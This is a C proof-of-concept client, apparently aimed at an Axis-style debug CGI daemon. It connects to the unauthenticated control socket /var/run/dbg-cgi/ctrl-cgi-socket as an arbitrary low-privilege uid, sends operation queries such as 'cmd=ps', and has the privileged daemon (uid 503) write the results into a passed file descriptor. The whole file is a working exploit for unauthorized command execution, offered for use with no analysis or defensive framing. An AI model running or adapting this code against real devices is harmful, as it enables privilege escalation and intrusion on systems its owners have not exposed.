/* dbox_client.c — PoC client for the dbg-cgi (dbox) control socket.
 * Speaks the fdipc wire format: sendmsg() a NUL-separated "path\0query" with an
 * SCM_RIGHTS-attached response fd. The daemon (uid 503) writes the op output
 * into the passed fd — no credentials, no authorization, per its import table.
 *
 * Usage (inside chroot): dbox_client <uid> <gid> <op-query>
 *   e.g. dbox_client 150 150 "cmd=ps"
 * Drops to <uid>/<gid> first, then connects to /var/run/dbg-cgi/ctrl-cgi-socket.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <time.h>
#include <unistd.h>

#define SOCK_PATH "/var/run/dbg-cgi/ctrl-cgi-socket"
#define PATH_PART "/axis-cgi/debug/debug.cgi"

int main(int argc, char **argv) {
    if (argc < 4) { fprintf(stderr, "usage: %s <uid> <gid> <query>\n", argv[0]); return 2; }
    uid_t uid = (uid_t)atoi(argv[1]);
    gid_t gid = (gid_t)atoi(argv[2]);
    const char *query = argv[3];

    char outfile[64];
    snprintf(outfile, sizeof outfile, "/tmp/dbox_out_%d", (int)uid);
    int outfd = open(outfile, O_CREAT | O_RDWR | O_TRUNC, 0666);
    if (outfd < 0) { perror("open out"); return 2; }

    if (setresgid(gid, gid, gid) != 0) { perror("setresgid"); return 2; }
    if (setresuid(uid, uid, uid) != 0) { perror("setresuid"); return 2; }
    printf("CLIENT uid=%d gid=%d euid=%d: connecting to %s\n", getuid(), getgid(), geteuid(), SOCK_PATH);

    int s = socket(AF_UNIX, SOCK_STREAM, 0);
    if (s < 0) { perror("socket"); return 2; }
    struct sockaddr_un addr;
    memset(&addr, 0, sizeof addr);
    addr.sun_family = AF_UNIX;
    strncpy(addr.sun_path, SOCK_PATH, sizeof addr.sun_path - 1);
    if (connect(s, (struct sockaddr *)&addr, sizeof addr) != 0) {
        fprintf(stderr, "CLIENT connect failed: errno=%d (%s)\n", errno, strerror(errno));
        return 3;
    }
    printf("CLIENT connect OK (as uid %d)\n", getuid());

    char req[512];
    int off = 0;
    off += snprintf(req + off, sizeof req - off, "%s", PATH_PART) + 1; /* keeps NUL */
    int qlen = snprintf(req + off, sizeof req - off, "%s", query) + 1;
    int total = off + qlen;

    struct msghdr msg;
    struct iovec iov;
    char cbuf[CMSG_SPACE(sizeof(int))];
    memset(&msg, 0, sizeof msg);
    iov.iov_base = req;
    iov.iov_len = total;
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = cbuf;
    msg.msg_controllen = sizeof cbuf;
    struct cmsghdr *c = CMSG_FIRSTHDR(&msg);
    c->cmsg_level = SOL_SOCKET;
    c->cmsg_type = SCM_RIGHTS;
    c->cmsg_len = CMSG_LEN(sizeof(int));
    memcpy(CMSG_DATA(c), &outfd, sizeof(int));

    ssize_t n = sendmsg(s, &msg, 0);
    printf("CLIENT sendmsg=%zd bytes (path='%s' query='%s' respfd=%d)\n", n, PATH_PART, query, outfd);
    if (n < 0) { fprintf(stderr, "CLIENT sendmsg errno=%d (%s)\n", errno, strerror(errno)); return 3; }

    /* response is written asynchronously by the daemon into outfd */
    for (int i = 0; i < 50; i++) {
        struct timespec ts = {0, 100 * 1000 * 1000};
        nanosleep(&ts, NULL);
        off_t sz = lseek(outfd, 0, SEEK_END);
        if (sz > 0) break;
    }
    off_t sz = lseek(outfd, 0, SEEK_END);
    printf("CLIENT response bytes written by daemon into our fd: %lld\n", (long long)sz);
    lseek(outfd, 0, SEEK_SET);
    char rb[4096];
    ssize_t r;
    while ((r = read(outfd, rb, sizeof rb)) > 0) fwrite(rb, 1, (size_t)r, stdout);
    fflush(stdout);
    close(s);
    close(outfd);
    return (sz > 0) ? 0 : 4;
}
